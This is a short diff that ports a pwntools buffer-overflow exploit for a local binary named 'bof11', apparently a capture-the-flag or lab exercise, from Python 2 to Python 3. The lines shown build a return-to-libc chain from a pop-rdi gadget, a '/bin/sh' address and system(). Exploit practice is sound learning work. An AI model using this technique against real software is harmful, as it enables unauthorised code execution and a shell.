@@ -1,4 +1,4 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 from pwn import *
   
 p = process('./bof11')
@@ -12,7 +12,7 @@ binsh = printf_addr + (1275223)
 poprdi = printf_addr + (-214782)
 distance_to_returnAddr = 18
   
-exploit = "A" * distance_to_returnAddr 
+exploit = str.encode("A" * distance_to_returnAddr)
 exploit += p64(poprdi)
 exploit += p64(binsh)
 exploit += p64(sys_addr)
